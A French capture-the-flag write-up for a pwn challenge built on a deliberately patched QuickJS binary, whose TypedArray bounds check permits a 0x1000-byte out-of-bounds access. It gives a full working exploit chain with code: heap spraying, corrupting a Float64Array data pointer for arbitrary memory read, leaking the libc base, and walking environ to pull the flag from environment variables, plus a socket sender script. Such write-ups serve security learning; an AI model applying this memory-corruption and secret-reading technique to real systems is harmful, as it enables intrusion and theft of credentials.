# PWN#006 — QuickJS TypedArray OOB (write-up)

**Auteur :** lyons

**Épreuve** : PWN#006 (144 pts)
**Service distant** : `<HOST>:<PORT>`
**Flag** : `CTF{REDACTED}`

---

## 1. Découverte du challenge

Le service exposé à distance reçoit du code JavaScript sur son entrée standard. Le protocole se déroule ainsi :

1. Le wrapper (`/challenge/run.sh`) consomme stdin jusqu'à tomber sur une ligne valant exactement `###RUN###` (ce marqueur sert de terminateur de heredoc).
2. Tout ce qui précède `###RUN###` est déposé dans `/tmp/script.XXXXXX.js` (nom tiré au hasard grâce à `mktemp`).
3. Le binaire `qjs` est alors lancé : `qjs /tmp/script.XXXXXX.js`
4. Ce que qjs produit sur stdout est retransmis au client.

Les éléments fournis sont les suivants :
- **qjs** : QuickJS en version 2024-01-13, PIE, stripped, lié dynamiquement
- **libc.so.6** : GLIBC 2.42 (Debian)
- **ld-linux-x86-64.so.2** et **libm.so.6** : chargeurs et bibliothèques du système

### Écarts par rapport au QuickJS 2024-01-13 d'origine

En mettant le binaire patché face à une compilation d'origine de QuickJS 2024-01-13, deux différences sont apparues :

1. **`JS_NewCustomContext` (0x1d1a0)** : les appels vers `js_init_module_std` et `js_init_module_os` ont été retirés. Il en découle que les modules `std` et `os` ne sont jamais enregistrés — `import("std")` et `import("os")` échouent avec "could not load module filename".

2. **`js_std_add_helpers` (0xb63f0)** : la déclaration de `__loadScript` comme fonction globale a été enlevée. Il ne subsiste que `console.log`, `print` et `scriptArgs`.

L'ensemble des autres fonctions du binaire (`js_print`, `js_module_loader`, `eval_file`, `eval_buf`, `js_object___getClass`, `JS_NewContext`, etc.) demeure identique à l'original. La fonction `__getClass` n'est **pas** un ajout spécifique — il s'agit d'une fonction stock de QuickJS 2024-01-13.

### Ce qui demeure disponible

- L'intégralité des built-ins JS usuels (Object, Array, Function, Promise, TypedArray, etc.)
- `print()` et `console.log()` (qui renvoient vers `js_print`)
- `scriptArgs` (tableau portant le chemin du script)
- L'appel dynamique `import()` (capable de charger des fichiers JS ou des `.so` via `dlopen`)
- Aucun module `std` ni `os` → aucun accès fichier, pas de `exec()`, aucune lecture de stdin

---

## 2. Identification de la faille

### Examen du constructeur TypedArray

Dans les sources d'origine de QuickJS 2024-01-13 (`quickjs.c`, ligne ~54682), le constructeur TypedArray pose un bounds-check :

```c
if ((offset + (len << size_log2)) > abuf->byte_length) {
    return JS_ThrowRangeError(ctx, "invalid length");
}
```

Le désassemblage du binaire patché révèle le code équivalent à l'adresse `0xa408e` :

```asm
a408b:  mov  0x0(%rbp), %edx          ; edx = abuf->byte_length
a408e:  add  $0x1000, %edx             ; edx = abuf->byte_length + 0x1000  ← BUG
a4094:  add  %r8, %rax                  ; rax = offset + (len << size_log2)
a409a:  cmp  %rax, %rdx                ; compare (byte_length + 0x1000) avec (offset + len*size)
a409d:  jae  a3bd9                     ; si (byte_length + 0x1000) >= (offset + len*size) → OK
a40a3:  lea  rsi, [rip+0x31e22]        ; sinon → "invalid length"
```

Le patch substitue `abuf->byte_length + 0x1000` à `abuf->byte_length` dans la comparaison. Concrètement, un TypedArray gagne le droit de déborder de **4096 octets (0x1000)** au-delà de la fin de son ArrayBuffer sous-jacent.

### Confirmation du défaut

```javascript
let ab = new ArrayBuffer(0x48);              // 72 octets de buffer
let ctrl = new Uint8Array(ab, 0, 0x1048);     // 4168 éléments demandés
print(ctrl.length);                            // → 4168 (au lieu d'une RangeError)
print(ctrl[0x47]);                             // byte dans le buffer (légitime)
print(ctrl[0x48]);                             // premier byte OOB (illégitime mais autorisé)
print(ctrl[0x1047]);                           // dernier byte OOB (0x1000 plus loin)
```

Le TypedArray `ctrl` dispose ainsi de 0x1000 octets lisibles et écrivables après son ArrayBuffer. Ces octets correspondent à ce que le tas abrite derrière le buffer.

---

## 3. Élaboration de la primitive OOB

### Idée directrice

Les 0x1000 octets hors-limites ouvrent la vue sur la zone du tas qui suit immédiatement le buffer de `ctrl`. On y croise d'autres allocations QuickJS : JSObjects, JSArrayBuffer structs, JSTypedArray structs, etc.

Le but consiste à repérer un TypedArray **victim** dans cette fenêtre puis à piéger son **pointeur de données** afin d'obtenir une lecture/écriture arbitraire.

### Agencement de JSObject (64-bit)

Le source QuickJS indique que la structure `JSObject` en 64-bit s'organise ainsi :

```
Offset  Taille  Champ
------  ------  ----------------------------------------------
0x00    4       ref_count
0x04    1       gc_obj_type (4 bits) | mark (4 bits)
0x05    1       flags (extensible, free_mark, is_exotic, ...)
0x06    2       class_id (uint16)
0x08    16      gc header link (list_head : next, prev)
0x18    8       shape (JSShape*)
0x20    8       prop (JSProperty*)
0x28    8       first_weak_ref
0x30    8       union u.u1 — pour TypedArray : u1.typed_array (JSTypedArray*)
0x38    8       union u.u  — pour TypedArray : u.ptr (pointeur de données)
0x40    4       union u.count (nombre d'éléments)
```

Dans le cas d'un Float64Array (class_id = 31 = 0x1F) :
- **obj+0x30** : référence vers la struct JSTypedArray (servant aux bounds-checks)
- **obj+0x38** : référence vers les données effectives (destination des reads/writes)
- **obj+0x40** : quantité d'éléments (count)

**Plan d'action** : dès qu'un Float64Array victim apparaît dans l'OOB, écraser son `u.ptr` (obj+0x38) par une adresse cible fait en sorte que `victim[0]` renvoie les 8 octets posés à cet endroit.

### Remplissage du tas de victims

On déverse 200 Float64Array portant des counts tous distincts, de façon à reconnaître quel victim se trouve dans la fenêtre :

```javascript
let V = [];
for (let i = 0; i < 200; i++) {
    V.push(new Float64Array(new ArrayBuffer(8 * (0x10 + i))));
    // count = 0x10 + i (unique), class_id = 0x1F
}
```

### Balayage de l'OOB à la recherche d'un victim

On parcourt la fenêtre OOB à la recherche de la signature d'un JSObject Float64Array :

```javascript
for (let o = 0x48; o < 0x1048 - 0x44; o += 8) {
    if (ctrl[o+6] !== 0x1F) continue;         // class_id = Float64Array
    if (ctrl[o+7] !== 0x00) continue;          // high byte of class_id
    let count = read_u32(ctrl, o + 0x40);      // count au offset 0x40
    if (count < 16 || count >= 216) continue;  // dans notre plage de spray
    let dp = read_u64(ctrl, o + 0x38);         // data pointer
    if ((dp >> 40n) & 0xFFn !== 0x55n) continue; // doit être un pointeur heap
    // Trouvé ! victim à l'offset o, index = count - 16
    F = o; I = count - 16; break;
}
```

Le test `(dp >> 40n) & 0xFFn === 0x55n` s'assure que le byte 5 du pointeur vaut 0x55, signature des adresses heap PIE (0x555555...).

---

## 4. La primitive de lecture arbitraire

Le victim étant localisé à l'offset `F` avec l'index `I`, la fonction de lecture arbitraire prend cette forme :

```javascript
let f2b = new Float64Array(1);                    // pour la conversion
let b2i = new BigInt64Array(f2b.buffer);           // vue BigInt sur le même buffer

let R = (addr) => {
    write_u64(ctrl, F + 0x38, addr);              // écrase le data pointer du victim
    f2b[0] = V[I][0];                             // lit 8 octets à l'adresse cible (via Float64)
    return b2i[0];                                // retourne comme BigInt
};
```

**Déroulement** :
1. `write_u64(ctrl, F+0x38, addr)` : place l'adresse visée dans le champ `u.ptr` du victim (par l'OOB de `ctrl`).
2. `V[I][0]` : QuickJS accède à `obj->u.array.u.ptr + 0 * 8`, soit l'adresse cible. Le retour est un Float64.
3. `b2i[0]` : transpose le Float64 en BigInt (buffer identique, vue différente). Les 8 octets bruts sont récupérés.

**Remarque sur la NaN-boxing** : les adresses x86-64 user-space (0x0000–0x7fff...) ne dessinent aucun pattern NaN en Float64 ; la conversion est donc sans risque.

---

## 5. Révélation de l'adresse libc

### Repérer un pointeur libc dans l'OOB

La fenêtre OOB abrite des pointeurs heap en tous genres (0x5555...) et, çà et là, des pointeurs libc (0x7f...). Un balayage sert à en isoler un :

```javascript
let lp = 0n;
for (let o = 0x48; o < 0x1048; o += 8) {
    let v = read_u64(ctrl, o);
    if ((Number(v >> 40n) & 0xFF) === 0x7f) {   // byte 5 = 0x7f → libc
        lp = v; break;
    }
}
```

Le pointeur libc obtenu présente un page offset invariable de `0xc20` (contrôle effectué sur 5 runs). La comparaison avec les symboles du libc livré montre que ce pointeur se situe à l'offset `0x75c20` dans libc.

### Déduction de la base libc

On descend depuis le pointeur révélé, page après page, à la recherche du magic ELF (`0x464c457f` = `\x7fELF`) :

```javascript
let base = 0n;
let s = lp & ~0xfffn;                            // aligne sur une page
for (let i = 0; i < 512 && !base; i++) {
    let v = R(s);
    if ((v & 0xFFFFFFFFn) === 0x464c457fn) {    // magic ELF
        base = s; break;
    }
    s -= 0x1000n;                                 // page précédente
}
```

La base libc retenue est alignée page et confirmée par le magic ELF. Résultat constant sur 5 runs locaux.

---

## 6. Passer par `environ` pour soutirer le flag

### Emplacement de `environ`

Dans le libc livré, le symbole `environ` occupe l'offset `0x1eee28` (section `.bss`) :

```
$ nm -D libc.so.6 | grep environ
00000000001eee28 B __environ@@GLIBC_2.2.5
00000000001eee28 V environ@@GLIBC_2.2.5
```

L'adresse `environ` renferme une référence vers le tableau `envp` (suite de pointeurs vers les chaînes d'environnement, close par NULL).

### Parcours du tableau envp

```javascript
let envp = R(base + 0x1eee28n);                  // pointeur vers envp[]
let p = envp;
for (let i = 0; i < 200; i++) {
    let sp = R(p);                                // pointeur vers une string
    if (sp === 0n) break;                         // fin du tableau
    let v = R(sp);                                // premiers 8 octets de la string
    if ((v & 0xFFFFFFFFn) === 0x47414c46n) {     // "FLAG" en little-endian
        // Lire la string complète
        let s = "";
        for (let j = 0; j < 64; j++) {
            let w = R(sp + BigInt(j * 8));
            for (let k = 0; k < 8; k++) {
                let c = Number((w >> BigInt(k * 8)) & 0xFFn);
                if (c === 0) { j = 64; break; }
                s += String.fromCharCode(c);
            }
        }
        print(s);                                 // → FLAG=CTF{...}
        break;
    }
    p += 8n;                                      // entrée suivante
}
```

La constante `0x47414c46` se lit "FLAG" en little-endian (F=0x46, L=0x4c, A=0x41, G=0x47).

---

## 7. Obstacles rencontrés

### Dépendance à la longueur du script

Le bytecode issu de la compilation du script est déposé sur le tas **avant** que l'exécution ne démarre. C'est la dimension de ce bytecode qui fixe la configuration du tas au moment où les victims sont réservées. Le moindre retrouchement du code (debug prints ajoutés, noms de variables changés, etc.) déplace les victims et peut les faire sortir de la fenêtre OOB de 0x1000 octets.

- **e9.js (1311 octets)** : localise le victim à F=400, opère en local
- **e18.js (1552 octets)** : échoue en local (victim écarté de la fenêtre), **mais réussit sur le remote** (heap layout différent)

L'issue est venue d'une validation menée directement sur le remote, où la configuration du tas laisse le victim atterrir dans la fenêtre OOB pour cette dimension de script précise.

### Transposition Float64 → BigInt

Les pointeurs x86-64 sont extraits par `V[I][0]` (Float64). Pour passer en BigInt, on s'appuie sur un ArrayBuffer mis en commun entre `Float64Array` et `BigInt64Array` :

```javascript
let f = new Float64Array(1);
let b = new BigInt64Array(f.buffer);
f[0] = V[I][0];        // lit 8 octets comme Float64
let ptr = b[0];         // même 8 octets comme BigInt
```

### Tri des adresses

Les adresses x86-64 user-space s'étendent sur 48 bits ; les 2 octets de poids haut valent donc 0x0000. Le premier filtre `>> 56n` était erroné (il renvoyait systématiquement 0). Le bon filtre contrôle le byte 5 (bits 40-47) :
- `0x55` ou `0x56` → référence heap (PIE)
- `0x7f` → référence libc (mmap)

---

## 8. Exploit final

```javascript
// e18.js — PWN#006 QuickJS TypedArray OOB exploit
// Bug: bounds check uses byte_length + 0x1000 instead of byte_length

let ab=new ArrayBuffer(0x48),ctrl=new Uint8Array(ab,0,0x1048),V=[];
for(let i=0;i<200;i++)V.push(new Float64Array(new ArrayBuffer(8*(0x10+i))));
let R8=(o)=>{let l=ctrl[o]|(ctrl[o+1]<<8)|(ctrl[o+2]<<16)|(ctrl[o+3]<<24);let h=ctrl[o+4]|(ctrl[o+5]<<8)|(ctrl[o+6]<<16)|(ctrl[o+7]<<24);return BigInt(l>>>0)+BigInt(h>>>0)*0x100000000n;};
let W8=(o,v)=>{let l=Number(v&0xFFFFFFFFn),h=Number((v>>32n)&0xFFFFFFFFn);ctrl[o]=l&255;ctrl[o+1]=(l>>8)&255;ctrl[o+2]=(l>>16)&255;ctrl[o+3]=(l>>24)&255;ctrl[o+4]=h&255;ctrl[o+5]=(h>>8)&255;ctrl[o+6]=(h>>16)&255;ctrl[o+7]=(h>>24)&255;};
let R32=(o)=>(ctrl[o]|(ctrl[o+1]<<8)|(ctrl[o+2]<<16)|(ctrl[o+3]<<24))>>>0;
let F=-1,I=-1;
for(let o=0x48;o<0x1048-0x44;o+=8){if(ctrl[o+6]!==31||ctrl[o+7]!==0)continue;let c=R32(o+0x40);if(c<16||c>=216)continue;let dp=R8(o+0x38);let b=Number(dp>>40n)&255;if(b!==85&&b!==86)continue;F=o;I=c-16;break;}
if(F<0)print("NF");
else{let f=new Float64Array(1),bi=new BigInt64Array(f.buffer);let R=(a)=>{W8(F+0x38,a);f[0]=V[I][0];return bi[0];};let lp=0n;for(let o=0x48;o<0x1048;o+=8){let v=R8(o);if((Number(v>>40n)&255)===127){lp=v;break;}}let base=0n,s=lp&~0xfffn;for(let i=0;i<512&&!base;i++){let v=R(s);if((v&0xFFFFFFFFn)===0x464c457fn)base=s;s-=0x1000n;}if(!base)print("NB");else{let p=R(base+0x1eee28n);for(let i=0;i<50;i++){let sp=R(p);if(!sp)break;let v=R(sp);if((v&0xFFFFFFFFn)===0x47414c46n){let s2="";for(let j=0;j<32;j++){let w2=R(sp+BigInt(j*8));for(let k=0;k<8;k++){let x=Number((w2>>BigInt(k*8))&255n);if(!x){j=32;break;}s2+=String.fromCharCode(x);}}print(s2);break;}p+=8n;}}}
```

### Mise en œuvre

```bash
python3 -c "
import socket, time
with open('e18.js','rb') as f: code=f.read()
s=socket.socket();s.settimeout(30);s.connect(('<HOST>',<PORT>))
s.sendall(code+b'\n###RUN###\n');time.sleep(15)
d=b''
try:
 while True:
  c=s.recv(8192)
  if not c:break
  d+=c
except:pass
print(d.decode())
"
# Output: FLAG=CTF{REDACTED}
```

---

## 9. Synthèse de la chaîne d'exploitation

```
┌─────────────────────────────────────────────────────────────────┐
│  Étape 1 : OOB Control Array                                    │
│  ArrayBuffer(0x48) → Uint8Array(ab, 0, 0x1048)                 │
│  0x1000 octets de lecture/écriture hors-limites                │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  Étape 2 : Spray + Scan                                         │
│  200 Float64Array victims avec counts uniques (16+i)           │
│  Scan OOB pour class_id=0x1F + count unique + ptr heap        │
│  → Identifie le victim (offset F, index I)                      │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  Étape 3 : Lecture arbitraire                                   │
│  W8(F+0x38, addr) → écrase data pointer du victim              │
│  V[I][0] → lit 8 octets à addr (Float64)                       │
│  Float64Array → BigInt64Array → BigInt                          │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  Étape 4 : Fuite libc                                           │
│  Scan OOB pour pointeur 0x7f... (byte 5 = 0x7f)               │
│  → Pointeur libc fuité (offset 0x75c20 dans libc)             │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  Étape 5 : Base libc                                            │
│  Scan descendant page par page depuis le pointeur fuité       │
│  Cherche magic ELF (0x464c457f) à offset 0                    │
│  → libc_base (page-alignée, vérifiée)                          │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  Étape 6 : Lecture environ                                      │
│  R(libc_base + 0x1eee28) → pointeur envp                       │
│  Scan envp[] pour "FLAG" (0x47414c46 en LE)                   │
│  Lit et affiche la string complète                             │
│  → FLAG=CTF{REDACTED}                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 10. Flag obtenu

```
CTF{REDACTED}
```

Résultat constant sur 5 exécutions d'affilée contre le service distant.
